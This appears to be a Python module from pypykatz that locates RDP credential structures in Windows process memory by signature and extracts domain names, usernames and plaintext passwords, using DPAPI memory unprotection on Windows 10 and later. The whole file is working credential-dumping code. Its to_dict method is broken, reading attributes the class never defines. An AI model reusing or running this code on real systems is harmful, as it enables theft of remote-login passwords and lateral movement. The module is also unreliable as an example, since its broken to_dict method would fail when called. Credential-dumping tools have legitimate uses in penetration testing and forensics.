import json
import hashlib

from pypykatz import logger
from pypykatz.commons.common import hexdump
from pypykatz.commons.common import KatzSystemArchitecture, WindowsBuild, WindowsMinBuild


class RDPCredential:
	def __init__(self):
		self.credtype = 'rdp'
		self.domainname = None
		self.username = None
		self.password = None
		self.password_raw = None

	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['domainname'] = self.cachedir
		t['username'] = self.PRT
		t['password'] = self.key_guid
		t['password_raw'] = self.dpapi_key
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== RDP Credential ==\n'
		t += '\t\tdomainname %s\n' % self.domainname
		t += '\t\tusername %s\n' % self.username
		t += '\t\tpassword %s\n' % self.password
		t += '\t\tpassword_raw %s\n' % self.password_raw.hex()
		return t

class RDPCredentialDecryptor:
	def __init__(self, process, reader, decryptor_template, sysinfo):
		self.process = process
		self.reader = reader
		self.sysinfo = sysinfo
		self.decryptor_template = decryptor_template
		self.credentials = []

	def add_entry(self, rdpcred_entry):
		try:
			if rdpcred_entry.cbDomain <= 512 and rdpcred_entry.cbUsername <= 512 and rdpcred_entry.cbPassword <= 512 and rdpcred_entry.cbPassword > 0:
				domainame = rdpcred_entry.Domain[:rdpcred_entry.cbDomain].decode('utf-16-le')
				username = rdpcred_entry.UserName[:rdpcred_entry.cbUsername].decode('utf-16-le')
				password_raw = rdpcred_entry.Password[:rdpcred_entry.cbPassword]

				if self.sysinfo.buildnumber >= WindowsMinBuild.WIN_10.value:
					if self.process is None:
						raise Exception ('Credentials found but they are encrypted!')

					password_raw = self.process.dpapi_memory_unprotect(rdpcred_entry.Password_addr, rdpcred_entry.cbPassword, 0)
					password = password_raw.decode('utf-16-le')
				else:
					password = password_raw.decode('utf-16-le')
					password_raw = password_raw.split(b'\x00\x00')[0] + b'\x00'

				cred = RDPCredential()
				cred.domainname = domainame
				cred.username = username
				cred.password = password
				cred.password_raw = password_raw
				self.credentials.append(cred)

			else:
				logger.debug('This RDPCred entry is garbage!')
		except Exception as e:
			logger.debug('RDP entry parsing error! Reason %s' % e)
			
	
	def start(self):
		for signature in self.decryptor_template.signatures:
			x = self.reader.find_all_global(signature)
			if len(x) == 0:
				logger.debug('No RDP credentials found!')
				return
			for addr in x:
				addr += self.decryptor_template.offset
				self.reader.move(addr)
				#print(hexdump(self.reader.peek(0x100)))
				try:
					cred = self.decryptor_template.cred_struct(self.reader)
				except Exception as e:
					logger.debug('Reading error! (this can be normal here) %s' % str(e))
					continue
				self.add_entry(cred)
